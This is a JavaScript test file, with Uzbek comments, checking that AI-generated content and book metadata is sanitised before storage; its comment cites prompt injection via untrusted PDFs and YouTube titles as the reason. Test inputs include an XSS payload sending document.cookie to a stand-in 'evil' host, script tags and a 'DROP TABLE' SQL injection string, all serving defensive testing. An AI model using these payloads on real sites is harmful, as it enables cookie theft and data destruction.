import test from 'node:test';
import assert from 'node:assert/strict';

import { normalizeContentMetadata, CONTENT_CATEGORIES } from '../functions/_lib/ai/content.js';
import { normalizeMetadata } from '../functions/_lib/ai/common.js';

// Manba matni (PDF, YouTube sarlavhasi) ishonchsiz — prompt injection orqali
// model javobiga HTML tushishi mumkin. Bu qiymatlar admin panelida va saytda
// ko'rsatiladi, shuning uchun bazaga yozishdan oldin tozalanishi shart.

test('kontent metadatasidan HTML teglari olib tashlanadi', () => {
  const result = normalizeContentMetadata({
    title: {
      uz: '<img src=x onerror="fetch(`//evil/`+document.cookie)">Zararli',
      ru: '<script>alert(1)</script>Тест',
      en: 'Safe title',
    },
    description: {
      uz: 'Oddiy tavsif <b>qalin</b> matn bilan',
      ru: '',
      en: '',
    },
    category: 'it',
  });

  for (const value of [result.title.uz, result.title.ru, result.description.uz]) {
    assert.ok(!value.includes('<'), `"<" qolmasligi kerak: ${value}`);
    assert.ok(!value.includes('>'), `">" qolmasligi kerak: ${value}`);
  }
  assert.ok(!result.title.uz.toLowerCase().includes('onerror'));
  assert.ok(result.title.uz.includes('Zararli'), 'foydali matn saqlanishi kerak');
  assert.ok(result.description.uz.includes('qalin'), 'teg ichidagi matn saqlanadi');
});

test("kitob metadatasidan ham HTML olib tashlanadi", () => {
  const result = normalizeMetadata({
    title: { uz: '<script>bad()</script>Kitob nomi', ru: '', en: '' },
    author: 'Muallif <img src=x onerror=alert(1)>',
    year: 2024,
    pages: 100,
    language: 'uz',
    description: { uz: '', ru: '', en: '' },
  }, 'fayl.pdf');

  assert.ok(!result.title.uz.includes('<'));
  assert.ok(!result.author.includes('<'));
  assert.ok(!result.author.toLowerCase().includes('onerror'));
  assert.ok(result.title.uz.includes('Kitob nomi'));
});

test("noma'lum kategoriya ruxsat etilgan ro'yxatga tushiriladi", () => {
  const evil = normalizeContentMetadata({ category: "it'; DROP TABLE books;--" });
  assert.equal(evil.category, 'boshqa');

  const unknown = normalizeContentMetadata({ category: 'kosmonavtika' });
  assert.equal(unknown.category, 'boshqa');

  for (const key of CONTENT_CATEGORIES) {
    assert.equal(normalizeContentMetadata({ category: key }).category, key);
  }
});

test('juda uzun qiymatlar qirqiladi', () => {
  const result = normalizeContentMetadata({
    title: { uz: 'A'.repeat(5000), ru: '', en: '' },
    description: { uz: 'B'.repeat(5000), ru: '', en: '' },
  });
  assert.ok(result.title.uz.length <= 250);
  assert.ok(result.description.uz.length <= 600);
});

test("bo'sh javob uchun zaxira sarlavha ishlatiladi", () => {
  const result = normalizeContentMetadata(null, 'Zaxira nomi');
  assert.equal(result.title.uz, 'Zaxira nomi');
  assert.equal(result.category, 'boshqa');
});
